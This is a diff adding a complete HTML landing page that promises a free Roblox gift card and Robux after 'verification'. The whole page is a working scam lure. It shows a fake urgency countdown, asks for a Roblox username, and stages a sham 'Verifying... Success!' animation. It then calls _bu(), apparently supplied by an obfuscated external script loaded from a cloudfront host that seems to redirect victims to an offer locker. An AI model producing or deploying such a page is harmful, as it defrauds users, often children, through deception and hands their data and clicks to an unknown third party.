@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Free Roblox Gift Card</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Animation keyframes - keeping existing animations */
+        @keyframes pulse {
+            0% {
+                opacity: 0.5;
+                transform: scale(0.8);
+            }
+
+            100% {
+                opacity: 1;
+                transform: scale(1.2);
+            }
+        }
+
+        @keyframes pulse2 {
+            0% {
+                transform: scale(1);
+            }
+
+            100% {
+                transform: scale(1.05);
+            }
+        }
+
+        @keyframes expandWidth {
+            from {
+                width: 0;
+            }
+
+            to {
+                width: 100px;
+            }
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes floatIn {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes slideInRight {
+            from {
+                opacity: 0;
+                transform: translateX(50px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        @keyframes cardAppear {
+            to {
+                opacity: 1;
+                transform: translateY(0) rotateY(0);
+            }
+        }
+
+        /* New animations for buttons */
+        @keyframes buttonGlow {
+            0% {
+                box-shadow: 0 0 5px rgba(255, 64, 129, 0.5);
+            }
+
+            50% {
+                box-shadow: 0 0 20px rgba(255, 64, 129, 0.8);
+            }
+
+            100% {
+                box-shadow: 0 0 5px rgba(255, 64, 129, 0.5);
+            }
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes shake {
+
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+
+            10%,
+            30%,
+            50%,
+            70%,
+            90% {
+                transform: translateX(-5px);
+            }
+
+            20%,
+            40%,
+            60%,
+            80% {
+                transform: translateX(5px);
+            }
+        }
+
+        /* Custom classes with animations - keeping existing ones */
+        .animate-fadeIn {
+            animation: fadeIn 0.8s ease-out;
+        }
+
+        .animate-floatIn {
+            animation: floatIn 1s ease-out;
+        }
+
+        .animate-slideInRight {
+            animation: slideInRight 1s ease-out;
+        }
+
+        .animate-pulse-glow {
+            animation: pulse 4s infinite alternate;
+        }
+
+        .animate-pulse-button {
+            animation: pulse2 2s infinite alternate;
+        }
+
+        .animate-expand-underline::after {
+            content: '';
+            position: absolute;
+            width: 50px;
+            height: 4px;
+            background-color: #FF4081;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            animation: expandWidth 1.5s forwards;
+        }
+
+        .animate-fadeInUp-1 {
+            opacity: 0;
+            animation: fadeInUp 0.6s ease-out 0.2s forwards;
+        }
+
+        .animate-fadeInUp-2 {
+            opacity: 0;
+            animation: fadeInUp 0.6s ease-out 0.4s forwards;
+        }
+
+        .animate-fadeInUp-3 {
+            opacity: 0;
+            animation: fadeInUp 0.6s ease-out 0.6s forwards;
+        }
+
+        .animate-cardAppear-1 {
+            opacity: 0;
+            transform: translateY(30px) rotateY(20deg);
+            animation: cardAppear 0.6s ease-out 0.2s forwards;
+        }
+
+        .animate-cardAppear-2 {
+            opacity: 0;
+            transform: translateY(30px) rotateY(20deg);
+            animation: cardAppear 0.6s ease-out 0.4s forwards;
+        }
+
+        .animate-cardAppear-3 {
+            opacity: 0;
+            transform: translateY(30px) rotateY(20deg);
+            animation: cardAppear 0.6s ease-out 0.6s forwards;
+        }
+
+        .animate-cardAppear-4 {
+            opacity: 0;
+            transform: translateY(30px) rotateY(20deg);
+            animation: cardAppear 0.6s ease-out 0.8s forwards;
+        }
+
+        /* New animation classes for buttons */
+        .animate-glow {
+            animation: buttonGlow 3s infinite;
+        }
+
+        .animate-shake {
+            animation: shake 0.5s ease-in-out;
+        }
+
+        /* Loader styles */
+        .loader {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid white;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        .button-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .btn-hover-effect:hover {
+            background-position: right center;
+            transition: 0.5s ease;
+        }
+    </style>
+    <script type="text/javascript">
+        var GMMfY_dCk_YaYJkc = { "it": 4452951, "key": "551f9" };
+    </script>
+    <script src="https://d29gqhzevia104.cloudfront.net/e439936.js"></script>
+</head>
+
+<body class="bg-neutral-900 text-white">
+    <nav
+        class="sticky top-0 z-50 flex flex-col justify-between items-center py-4 bg-neutral-900 border-b border-neutral-700 animate-fadeIn">
+        <div class="logo mb-2">
+            <img src="https://images.rbxcdn.com/27abeb289f69e5c4c39f4018bc56ef3d" width="80%" alt="Roblox" class="h-9">
+        </div>
+        <div class="pt-4">
+            <button onclick="claimWithAnimation(this)"
+                class="claim-btn bg-gradient-to-r from-pink-500 to-pink-400 text-white font-bold py-2 px-6 rounded-lg transition duration-300 hover:shadow-lg hover:shadow-pink-500/30 animate-glow btn-hover-effect">
+                <span class="button-content">
+                    🎁 Claim Free Card Now
+                </span>
+            </button>
+        </div>
+    </nav>
+
+
+    <section class="flex flex-col md:flex-row justify-center items-center px-8 py-16 max-w-6xl mx-auto gap-8">
+        <div class="md:w-1/2 relative animate-floatIn">
+            <div class="absolute inset-0 bg-gradient-radial from-pink-500/20 to-transparent animate-pulse-glow -z-10">
+            </div>
+            <img src="https://images.rbxcdn.com/bf6f7bdab9fd8b460a8e1b53f8834aa4" width="100%"
+                alt="Free Roblox Gift Card" class="max-w-md mx-auto">
+        </div>
+        <div class="md:w-1/2 text-center animate-slideInRight">
+            <h1 class="text-4xl font-bold mb-6 inline-block relative animate-expand-underline">
+                🎁 Claim Your FREE Roblox Gift Card NOW!
+            </h1>
+            <p class="text-lg mb-8 leading-relaxed opacity-0 animate-fadeIn"
+                style="animation-delay: 0.5s; animation-fill-mode: forwards;">
+                Limited-time offer! Get a FREE Roblox Gift Card with FREE Robux after completing a simple verification.
+                No purchase necessary!
+            </p>
+
+        </div>
+    </section>
+
+    <section class="bg-neutral-900 py-12 px-8">
+        <h2 class="text-2xl font-bold mb-12 text-center relative inline-block left-1/2 transform -translate-x-1/2">
+            Don't Miss This Limited Offer!
+            <span class="absolute bottom-0 left-0 w-full h-0.5 bg-pink-500"></span>
+        </h2>
+        <div class="max-w-2xl mx-auto text-center">
+            <div
+                class="inline-block text-pink-500 font-bold py-2 px-4 border-2 border-pink-500 rounded mb-8 animate-pulse-button">
+                LIMITED TIME ONLY
+            </div>
+            <div class="flex flex-wrap justify-center gap-4 mb-8">
+                <div class="flex flex-col items-center bg-neutral-700 p-4 rounded min-w-[80px]">
+                    <div class="text-2xl font-bold text-pink-500">01</div>
+                    <div class="text-sm text-neutral-400">Days</div>
+                </div>
+                <div class="flex flex-col items-center bg-neutral-700 p-4 rounded min-w-[80px]">
+                    <div class="text-2xl font-bold text-pink-500">11</div>
+                    <div class="text-sm text-neutral-400">Hours</div>
+                </div>
+                <div class="flex flex-col items-center bg-neutral-700 p-4 rounded min-w-[80px]">
+                    <div class="text-2xl font-bold text-pink-500">45</div>
+                    <div class="text-sm text-neutral-400">Minutes</div>
+                </div>
+                <div class="flex flex-col items-center bg-neutral-700 p-4 rounded min-w-[80px]">
+                    <div class="text-2xl font-bold text-pink-500">19</div>
+                    <div class="text-sm text-neutral-400">Seconds</div>
+                </div>
+            </div>
+            <button onclick="claimWithAnimation(this)"
+                class="claim-btn bg-gradient-to-r from-pink-500 to-pink-400 text-white font-bold py-3 px-16 text-lg rounded-lg transition duration-300 hover:shadow-lg hover:shadow-pink-500/30 animate-glow btn-hover-effect">
+                <span class="button-content">
+                    🎁 Claim Your Free Card Now
+                </span>
+            </button>
+        </div>
+    </section>
+
+    <section class="bg-rgba(255, 255, 255, 0.2) py-12 px-8 relative overflow-hidden">
+        <div class="absolute inset-0 bg-gradient-to-r from-pink-500/5 to-transparent -z-10"></div>
+        <h2 class="text-2xl font-bold mb-12 text-center relative inline-block left-1/2 transform -translate-x-1/2">
+            How To Claim Your Free Card
+            <span class="absolute bottom-0 left-0 w-full h-0.5 bg-pink-500"></span>
+        </h2>
+        <div class="flex flex-wrap justify-center gap-8">
+            <div
+                class="flex-1 min-w-[300px] text-center p-8 bg-neutral-800 rounded-lg transition duration-300 hover:transform hover:-translate-y-2 hover:shadow-lg hover:shadow-black/30 relative animate-fadeInUp-1">
+                <div class="inline-block w-10 h-10 bg-pink-500 text-white rounded-full leading-10 font-bold mb-4">1
+                </div>
+                <h3 class="text-xl font-bold mb-4">Complete Verification</h3>
+                <p>Answer a few simple questions to verify you're a real person</p>
+            </div>
+            <div
+                class="flex-1 min-w-[300px] text-center p-8 bg-neutral-800 rounded-lg transition duration-300 hover:transform hover:-translate-y-2 hover:shadow-lg hover:shadow-black/30 relative animate-fadeInUp-2">
+                <div class="inline-block w-10 h-10 bg-pink-500 text-white rounded-full leading-10 font-bold mb-4">2
+                </div>
+                <h3 class="text-xl font-bold mb-4">Choose Your Card</h3>
+                <p>Select from $5, $10, $20 denominations</p>
+            </div>
+            <div
+                class="flex-1 min-w-[300px] text-center p-8 bg-neutral-800 rounded-lg transition duration-300 hover:transform hover:-translate-y-2 hover:shadow-lg hover:shadow-black/30 relative animate-fadeInUp-3">
+                <div class="inline-block w-10 h-10 bg-pink-500 text-white rounded-full leading-10 font-bold mb-4">3
+                </div>
+                <h3 class="text-xl font-bold mb-4">Get Instant Delivery</h3>
+                <p>Receive your code immediately via email</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="py-12 px-8">
+        <h2 class="text-2xl font-bold mb-12 text-center relative inline-block left-1/2 transform -translate-x-1/2">
+            What You'll Get
+            <span class="absolute bottom-0 left-0 w-full h-0.5 bg-pink-500"></span>
+        </h2>
+        <div class="flex flex-wrap justify-center gap-8 perspective-1000">
+            <div
+                class="w-[220px] bg-neutral-800 rounded-xl overflow-hidden shadow-md transition duration-500 animate-cardAppear-1 hover:transform hover:-translate-y-4 hover:rotate-y-5 hover:shadow-lg hover:shadow-pink-500/20">
+                <div
+                    class="h-32 flex items-center justify-center text-4xl font-bold bg-gradient-to-br from-neutral-700 to-neutral-600 relative overflow-hidden">
+                    🎮
+                </div>
+                <div class="p-6 text-center transition duration-300">
+                    <div class="text-xl font-bold mb-2 text-white transition duration-300">Free Robux</div>
+                    <p class="text-neutral-400 text-sm">Get up to 6000 Robux to spend in-game</p>
+                </div>
+            </div>
+            <div
+                class="w-[220px] bg-neutral-800 rounded-xl overflow-hidden shadow-md transition duration-500 animate-cardAppear-2 hover:transform hover:-translate-y-4 hover:rotate-y-5 hover:shadow-lg hover:shadow-pink-500/20">
+                <div
+                    class="h-32 flex items-center justify-center text-4xl font-bold bg-gradient-to-br from-neutral-700 to-neutral-600 relative overflow-hidden">
+                    👑
+                </div>
+                <div class="p-6 text-center transition duration-300">
+                    <div class="text-xl font-bold mb-2 text-white transition duration-300">Exclusive Items</div>
+                    <p class="text-neutral-400 text-sm">Unlock special virtual items only available with cards</p>
+                </div>
+            </div>
+            <div
+                class="w-[220px] bg-neutral-800 rounded-xl overflow-hidden shadow-md transition duration-500 animate-cardAppear-3 hover:transform hover:-translate-y-4 hover:rotate-y-5 hover:shadow-lg hover:shadow-pink-500/20">
+                <div
+                    class="h-32 flex items-center justify-center text-4xl font-bold bg-gradient-to-br from-neutral-700 to-neutral-600 relative overflow-hidden">
+                    🚀
+                </div>
+                <div class="p-6 text-center transition duration-300">
+                    <div class="text-xl font-bold mb-2 text-white transition duration-300">Premium Benefits</div>
+                    <p class="text-neutral-400 text-sm">Unlock special features and experiences</p>
+                </div>
+            </div>
+            <div
+                class="w-[220px] bg-neutral-800 rounded-xl overflow-hidden shadow-md transition duration-500 animate-cardAppear-4 hover:transform hover:-translate-y-4 hover:rotate-y-5 hover:shadow-lg hover:shadow-pink-500/20">
+                <div
+                    class="h-32 flex items-center justify-center text-4xl font-bold bg-gradient-to-br from-neutral-700 to-neutral-600 relative overflow-hidden">
+                    🎁
+                </div>
+                <div class="p-6 text-center transition duration-300">
+                    <div class="text-xl font-bold mb-2 text-white transition duration-300">Gift Options</div>
+                    <p class="text-neutral-400 text-sm">Perfect for sharing with friends</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+
+
+    <footer class="bg-neutral-950 py-8 px-8 text-center text-sm text-neutral-500 relative overflow-hidden">
+        <div class="absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-pink-500 to-transparent">
+        </div>
+        <p>© 2025 Roblox Gift Card Offer. This is a promotional website. Not affiliated with Roblox Corporation.</p>
+        <p class="mt-2">Terms & Conditions Apply. Limited time offer while supplies last.</p>
+    </footer>
+
+    <!-- Modal -->
+    <div id="claimModal"
+        class="fixed inset-0 bg-black/85 z-50 hidden opacity-0 transition-opacity duration-300 overflow-y-auto">
+        <div class="bg-neutral-900 max-w-md w-[90%] mx-auto my-12 rounded-xl shadow-2xl relative transform -translate-y-12 opacity-0 transition-all duration-400"
+            id="modalContent">
+            <div class="bg-gradient-to-r flex flex-col from-pink-500 to-pink-400 p-6 text-center relative rounded-t-xl">
+
+                <img src="https://images.rbxcdn.com/bf6f7bdab9fd8b460a8e1b53f8834aa4"
+                    class="w-1/3  mx-auto mb-6 drop-shadow-lg" alt="Roblox Gift Card">
+                <h3 class="text-white text-2xl m-0 p-0 text-shadow">
+                    Claim Your Free Gift Card</h3>
+                <button onclick="closeModal()"
+                    class="absolute right-4 top-4 text-white text-2xl bg-transparent border-none cursor-pointer transition-transform duration-300 hover:rotate-90">×</button>
+            </div>
+            <div class="p-8 text-center">
+
+
+                <form id="giftCardForm">
+                    <div class="mb-6 text-left">
+                        <label class="block mb-2 font-bold text-neutral-200" for="username">Roblox Username</label>
+                        <input type="text" id="username"
+                            class="w-full p-3 rounded bg-neutral-700 border-2 border-neutral-600 text-white focus:border-pink-500 focus:outline-none focus:shadow-outline-pink"
+                            placeholder="Enter your Roblox username">
+                    </div>
+
+
+                    <div class="mb-6 text-left">
+                        <label class="block mb-2 font-bold text-neutral-200" for="card-amount">Gift Card Amount</label>
+
+                        <div class="flex flex-col gap-4">
+                            <!-- $5 Card -->
+                            <div
+                                class="card bg-neutral-700 border-2 border-neutral-600 rounded-lg text-white hover:border-pink-500 transition-colors cursor-pointer w-full">
+                                <div class="card-body p-4">
+                                    <div class="flex justify-between items-center">
+                                        <div>
+                                            <h2 class="card-title text-lg">$5 Gift Card</h2>
+                                            <p class="text-neutral-300">800 Robux</p>
+                                        </div>
+                                        <img width="20%"
+                                            src="https://th.bing.com/th/id/R.95fd97be59049df5a49daf0dcf78832e?rik=IscTisfRFRyeEw&pid=ImgRaw&r=0"
+                                            alt="">
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- $10 Card -->
+                            <div
+                                class="card bg-neutral-700 border-2 border-neutral-600 rounded-lg text-white hover:border-pink-500 transition-colors cursor-pointer w-full">
+                                <div class="card-body p-4">
+                                    <div class="flex justify-between items-center">
+                                        <div>
+                                            <h2 class="card-title text-lg">$10 Gift Card</h2>
+                                            <p class="text-neutral-300">1,700 Robux</p>
+                                        </div>
+                                        <img width="20%"
+                                            src="https://th.bing.com/th/id/R.95fd97be59049df5a49daf0dcf78832e?rik=IscTisfRFRyeEw&pid=ImgRaw&r=0"
+                                            alt="">
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- $20 Card -->
+                            <div
+                                class="card bg-neutral-700 border-2 border-neutral-600 rounded-lg text-white hover:border-pink-500 transition-colors cursor-pointer w-full">
+                                <div class="card-body p-4">
+                                    <div class="flex justify-between items-center">
+                                        <div>
+                                            <h2 class="card-title text-lg">$20 Gift Card</h2>
+                                            <p class="text-neutral-300">3,800 Robux</p>
+                                        </div>
+                                        <img width="20%"
+                                            src="https://th.bing.com/th/id/R.95fd97be59049df5a49daf0dcf78832e?rik=IscTisfRFRyeEw&pid=ImgRaw&r=0"
+                                            alt="">
+                                    </div>
+                                </div>
+                            </div>
+
+                        </div>
+                    </div>
+
+
+                    <button type="button" id="submitButton" onclick="submitWithAnimation(this)"
+                        class="w-full bg-gradient-to-r from-pink-500 to-pink-400 text-white font-bold py-3 px-8 text-lg rounded-lg transition duration-300 transform hover:-translate-y-1 hover:shadow-lg hover:shadow-pink-500/40 animate-glow btn-hover-effect">
+                        <span class="button-content">
+                            Verify & Claim Now
+                        </span>
+                    </button>
+
+
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Modal functions
+        function openModal() {
+            const modal = document.getElementById('claimModal');
+            const modalContent = document.getElementById('modalContent');
+
+            modal.classList.remove('hidden');
+            setTimeout(() => {
+                modal.classList.add('opacity-100');
+                modalContent.style.transform = 'translateY(0)';
+                modalContent.style.opacity = '1';
+            }, 10);
+        }
+
+        function closeModal() {
+            const modal = document.getElementById('claimModal');
+            const modalContent = document.getElementById('modalContent');
+
+            modalContent.style.transform = 'translateY(-50px)';
+            modalContent.style.opacity = '0';
+            modal.classList.remove('opacity-100');
+
+            setTimeout(() => {
+                modal.classList.add('hidden');
+            }, 300);
+        }
+
+        // Update gift amount display
+        function updateGiftAmount() {
+            const select = document.getElementById('card-amount');
+            const display = document.getElementById('giftAmountDisplay');
+            if (display) {
+                display.textContent = '$' + select.value;
+            }
+        }
+
+        // Button animation and loader functions
+        function claimWithAnimation(button) {
+            // Add shake animation
+            button.classList.add('animate-shake');
+
+            // Replace content with loader
+            const buttonContent = button.querySelector('.button-content');
+            const originalContent = buttonContent.innerHTML;
+            buttonContent.innerHTML = '<div class="loader"></div>Processing...';
+
+            // After animation, open modal
+            setTimeout(() => {
+                buttonContent.innerHTML = originalContent;
+                button.classList.remove('animate-shake');
+                openModal();
+            }, 1500);
+        }
+
+        function submitWithAnimation(button) {
+            // Disable button
+            button.disabled = true;
+
+            // Replace content with loader
+            const buttonContent = button.querySelector('.button-content');
+            const originalContent = buttonContent.innerHTML;
+            buttonContent.innerHTML = '<div class="loader"></div>Verifying...';
+
+            // Add glow effect
+            button.classList.add('animate-glow');
+
+            // Simulate verification process
+            setTimeout(() => {
+                buttonContent.innerHTML = '<div class="loader"></div>Processing...';
+
+                setTimeout(() => {
+                    buttonContent.innerHTML = '✅ Success! Redirecting...';
+
+                    // Simulate redirect after "success"
+                    setTimeout(() => {
+                        _bu(); // Call the original function
+                        button.disabled = false;
+                        buttonContent.innerHTML = originalContent;
+                    }, 1500);
+                }, 1500);
+            }, 1500);
+        }
+
+        // Form submission
+        document.getElementById('giftCardForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+            submitWithAnimation(document.getElementById('submitButton'));
+        });
+
+        // Make card options clickable
+        document.querySelectorAll('.card').forEach(card => {
+            card.addEventListener('click', function () {
+                // Remove selected class from all cards
+                document.querySelectorAll('.card').forEach(c => {
+                    c.classList.remove('border-pink-500');
+                    c.classList.add('border-neutral-600');
+                });
+
+                // Add selected class to clicked card
+                this.classList.remove('border-neutral-600');
+                this.classList.add('border-pink-500');
+            });
+        });
+
+        // Initialize the gift amount display
+        updateGiftAmount();
+
+        // Function to update counter
+        function updateCounter() {
+            const days = document.querySelector('.text-2xl:nth-of-type(1)');
+            const hours = document.querySelector('.text-2xl:nth-of-type(2)');
+            const minutes = document.querySelector('.text-2xl:nth-of-type(3)');
+            const seconds = document.querySelector('.text-2xl:nth-of-type(4)');
+
+            if (seconds) {
+                let sec = parseInt(seconds.textContent);
+                sec--;
+
+                if (sec < 0) {
+                    sec = 59;
+                    let min = parseInt(minutes.textContent);
+                    min--;
+
+                    if (min < 0) {
+                        min = 59;
+                        let hr = parseInt(hours.textContent);
+                        hr--;
+
+                        if (hr < 0) {
+                            hr = 23;
+                            let day = parseInt(days.textContent);
+                            day--;
+
+                            if (day < 0) {
+                                day = 0;
+                                hr = 0;
+                                min = 0;
+                                sec = 0;
+                            }
+
+                            days.textContent = day.toString().padStart(2, '0');
+                        }
+
+                        hours.textContent = hr.toString().padStart(2, '0');
+                    }
+
+                    minutes.textContent = min.toString().padStart(2, '0');
+                }
+
+                seconds.textContent = sec.toString().padStart(2, '0');
+            }
+        }
+
+        // Update counter every second
+        setInterval(updateCounter, 1000);
+    </script>
+</body>
+
+</html>
